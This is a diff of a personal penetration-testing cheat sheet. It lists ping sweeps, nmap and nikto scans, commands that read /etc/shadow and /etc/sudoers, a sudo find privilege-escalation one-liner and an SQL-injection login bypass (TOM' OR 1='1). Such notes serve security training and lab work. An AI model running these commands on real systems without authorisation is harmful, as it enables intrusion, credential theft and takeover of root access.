@@ -7,18 +7,22 @@
                                     888   d88P Y88b. .d88P 888  .d88P 888  .d88P 888    888  d8888888888 
                                     8888888P"   "Y88888P"  8888888P"  8888888P"  888    888 d88P     888 
                                                                      
-                                                                     
-                                                                    
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------                                                      
+
 Host Discovery
     Linux: for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
 
     Windows: for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up
 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 Port Interrogation
     - nmap -sS -Pn <ip> -p 135-139,22,80,443,21,8080
           - May require sudo/proxychains
     - nc -z -v -w 1 <ip> <port>
-     
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 Web-Server Ennumeration
     - nmap -v -sT -Pn -T4 -sV <IP>
     - proxychains wget -r http://<ip>:<port>
@@ -27,6 +31,8 @@ Web-Server Ennumeration
     - proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>
     - nikto v -h <IP>
 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 Files of Interest
     - cat /etc/sudoers
     - cat /etc/hosts
@@ -34,6 +40,8 @@ Files of Interest
     - cat /etc/shadow
     - cat /resolv.conf
     - cat /etc/crontab
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Linux Privilege Escalation
 
@@ -46,35 +54,44 @@ Linux Privilege Escalation
 
 - sudo find . -exec su root \; -quit
 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Lsof
 - sudo lsof -i -P -n | grep LISTEN
       - See all open ports
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Windows
 - scheduled tasks
 - registry
 - services
 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Using Dev Tools
-Access the Admin Welcome Page
+
+1.) Access the Admin Welcome Page
 - username: TOM' OR 1='1
 - password: TOM' OR 1='1
 
-Backup one page <-
+2.) Backup one page <-
 - f12 or inspect element
 - Keep Dev Tools open as you login again
   
-After you've made it to the Admin Welcome Page
+3.) After you've made it to the Admin Welcome Page
 - Networks Tab
 - Select the method used
 - View request as raw 
 - Copy string
 
-Input Raw String
+4.) Input Raw String
 - ".../login.php?<raw String>
 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 **Rescan Initial Network After each new host you gain access to** 
+
+
 
 
